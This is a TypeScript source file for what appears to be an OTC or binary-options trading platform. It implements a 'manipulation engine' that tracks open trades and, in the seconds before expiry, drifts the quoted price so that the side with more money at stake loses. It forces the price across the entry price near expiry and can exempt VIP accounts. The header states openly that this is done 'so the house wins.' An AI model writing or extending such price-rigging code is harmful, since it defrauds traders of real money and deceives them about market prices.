/**
 * OTC Manipulation Engine
 * Tracks open trade exposure and applies a soft drift in the last N seconds
 * before the trade expires so the house wins.
 */

import db from "@/lib/db";

export type ManipulationMode = "off" | "always" | "vip_safe";

export type ManipConfig = {
  mode:           ManipulationMode;
  driftWindowSec: number;  // how many seconds before expiry to start drift
  driftMaxPct:    number;  // max % move applied (e.g. 0.0015 = 0.15%)
};

export type Exposure = {
  id:         string;
  userId:     number | null;
  vip:        boolean;
  asset:      string;
  direction:  "up" | "down";
  amount:     number;
  entryPrice: number;
  expiresAt:  number; // ms
};

const openExposures: Map<string, Exposure> = new Map();

// Settings persisted in `settings` table
export function getConfig(): ManipConfig {
  try {
    const rows = db.prepare("SELECT key, value FROM settings WHERE key IN ('otc_mode','otc_drift_window','otc_drift_max')").all() as Array<{ key: string; value: string }>;
    const m: Record<string, string> = {};
    for (const r of rows) m[r.key] = r.value;
    const mode = (m["otc_mode"] as ManipulationMode) || "always";
    return {
      mode: ["off", "always", "vip_safe"].includes(mode) ? mode : "always",
      driftWindowSec: parseFloat(m["otc_drift_window"] || "10"),
      driftMaxPct:    parseFloat(m["otc_drift_max"]    || "0.0015"),
    };
  } catch {
    return { mode: "always", driftWindowSec: 10, driftMaxPct: 0.0015 };
  }
}

export function saveConfig(patch: Partial<ManipConfig>) {
  const stmt = db.prepare("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)");
  if (patch.mode != null)           stmt.run("otc_mode", patch.mode);
  if (patch.driftWindowSec != null) stmt.run("otc_drift_window", String(patch.driftWindowSec));
  if (patch.driftMaxPct != null)    stmt.run("otc_drift_max", String(patch.driftMaxPct));
}

export function addExposure(ex: Exposure) {
  openExposures.set(ex.id, ex);
  const ttl = ex.expiresAt - Date.now() + 30_000;
  if (ttl > 0) setTimeout(() => openExposures.delete(ex.id), ttl);
}

export function removeExposure(id: string) { openExposures.delete(id); }

export function listExposures(): Exposure[] {
  return Array.from(openExposures.values());
}

export function getExposureStats() {
  const byAsset: Record<string, { up: number; down: number; count: number }> = {};
  for (const ex of openExposures.values()) {
    if (!byAsset[ex.asset]) byAsset[ex.asset] = { up: 0, down: 0, count: 0 };
    byAsset[ex.asset].count++;
    if (ex.direction === "up") byAsset[ex.asset].up += ex.amount;
    else byAsset[ex.asset].down += ex.amount;
  }
  return byAsset;
}

/** Apply manipulation to a fair price for a given asset right now. */
export function applyManipulation(asset: string, fairPrice: number, nowMs: number = Date.now()): number {
  const cfg = getConfig();
  if (cfg.mode === "off") return fairPrice;
  if (fairPrice <= 0) return fairPrice;

  let upAmount = 0, downAmount = 0;
  let closestEntry: number | null = null;
  let minTimeLeft = Infinity;

  for (const ex of openExposures.values()) {
    if (ex.asset !== asset) continue;
    if (cfg.mode === "vip_safe" && ex.vip) continue;
    const tl = (ex.expiresAt - nowMs) / 1000;
    if (tl <= 0 || tl > cfg.driftWindowSec) continue;
    if (ex.direction === "up") upAmount += ex.amount;
    else                       downAmount += ex.amount;
    if (tl < minTimeLeft) { minTimeLeft = tl; closestEntry = ex.entryPrice; }
  }

  if ((upAmount === 0 && downAmount === 0) || closestEntry === null) return fairPrice;

  // Push toward the side with LESS money so the heavier side loses
  const houseWantsUp = downAmount > upAmount;
  const ramp = 1 - minTimeLeft / cfg.driftWindowSec; // 0..1
  const smooth = (1 - Math.cos(ramp * Math.PI)) / 2;
  const direction = houseWantsUp ? 1 : -1;
  const targetOffset = Math.abs(closestEntry) * cfg.driftMaxPct * direction;
  let drifted = fairPrice + targetOffset * smooth;

  // Guarantee crossing the entry near expiry
  if (smooth > 0.7) {
    const minStep = Math.abs(closestEntry) * 0.0001;
    if (houseWantsUp && drifted <= closestEntry) drifted = closestEntry + minStep;
    if (!houseWantsUp && drifted >= closestEntry) drifted = closestEntry - minStep;
  }
  return drifted;
}
